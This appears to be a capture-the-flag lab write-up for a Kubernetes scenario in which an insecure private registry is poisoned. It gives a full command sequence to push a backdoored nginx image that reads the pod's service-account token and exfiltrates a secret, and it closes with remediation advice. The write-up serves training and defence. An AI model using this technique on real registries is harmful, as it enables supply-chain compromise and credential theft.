# K8S-09: Private Registry Poisoning

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-09 |
| 名称 | Private Registry Poisoning |
| 技术/CVE | N/A (misconfiguration) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | localhost:10500 |

## 场景概述
- 技术：N/A (misconfiguration) -- 无鉴权私有镜像仓库 + 可变 tag + Always 拉取
- 难度：L2
- 交付方式：k8s

## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A -- insecure registry with mutable tags |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-09-registry |
| Registry | localhost:10500 (no TLS, on the kind network as `k8s-registry`) |
| Flag Location | Secret `registry-flag` in namespace `default` (readable only by the workload SA) |

## Attack Path Summary
1. An insecure private registry runs on `localhost:10500` (no TLS), attached to the kind network as `k8s-registry`
2. A Deployment (`registry-target`) pulls `k8s-registry:5000/backdoored-nginx:latest` with `imagePullPolicy: Always`
3. The attacker pushes a malicious image with the same tag to the registry
4. Deleting the pod forces a re-pull; the Deployment runs the backdoored image
5. The backdoored payload uses the pod SA token to read Secret `registry-flag` and writes it to `/tmp/flag.txt`

## Prerequisites
- kubectl access to KIND cluster `cve-k8s-09-registry`
- Docker CLI with access to the host Docker daemon
- Network access to `localhost:10500`

## Step-by-Step Exploitation

### Step 1: Verify the Insecure Registry
```bash
curl -s http://localhost:10500/v2/
# Expected: {}
curl -s http://localhost:10500/v2/_catalog
# Expected: {"repositories":["backdoored-nginx"]}
```

### Step 2: Create a Backdoored Image
```bash
mkdir -p /tmp/backdoor
cat > /tmp/backdoor/Dockerfile << 'EOF'
FROM nginx:1.24-alpine
RUN apk add --no-cache curl python3
COPY payload.sh /docker-entrypoint.d/40-payload.sh
RUN chmod +x /docker-entrypoint.d/40-payload.sh
EOF

cat > /tmp/backdoor/payload.sh << 'EOF'
#!/bin/sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert "$CA" -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets/registry-flag \
  | python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']['flag']).decode())" \
  > /tmp/flag.txt
EOF

docker build -t localhost:10500/backdoored-nginx:latest /tmp/backdoor/
```

> 注意：payload 需要 python3 解析 Secret JSON；若基础镜像没有，可改用
> `grep -o '"flag":"[^"]*"'` + base64 处理，或在 Dockerfile 中安装。

### Step 3: Push the Malicious Image
```bash
docker push localhost:10500/backdoored-nginx:latest
curl -s http://localhost:10500/v2/backdoored-nginx/tags/list
# Expected: {"name":"backdoored-nginx","tags":["latest"]}
```

### Step 4: Trigger Pod Re-pull
```bash
kubectl delete pod -l app=registry-target
kubectl get pods -l app=registry-target -w
```

### Step 5: Read the Flag
```bash
NEW_POD=$(kubectl get pods -l app=registry-target -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$NEW_POD" -- cat /tmp/flag.txt
# Expected: flag{k8s-09-*}
```

## Flag Location
- Secret `registry-flag` in namespace `default` (readable by the default SA via the
  pre-configured `registry-secret-reader` RoleBinding)
- Flag format: `flag{k8s-09-*}`

## Verification
```bash
cd cve_challenges/scenarios/k8s/registry-poison && bash deploy.sh
curl -s http://localhost:10500/v2/
kubectl get deploy registry-target
bash teardown.sh
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Container image registries and Kubernetes image pull behavior |
| 侦察与前置条件 | Registry authentication and mutable image/tag inspection |
| 核心漏洞与利用 | Push or replace a trusted image in the private registry |
| 权限、横向或影响 | Supply-chain execution in cluster workloads |
| 验证 | Observe the poisoned workload and retrieve its flag |

## 修复建议
私有镜像仓库必须启用鉴权、TLS 与推送审计；集群内镜像引用使用不可变 digest；
对 `imagePullPolicy: Always` 的 Deployment 做镜像来源准入校验（Kyverno/Gatekeeper）
并开启镜像签名验证。
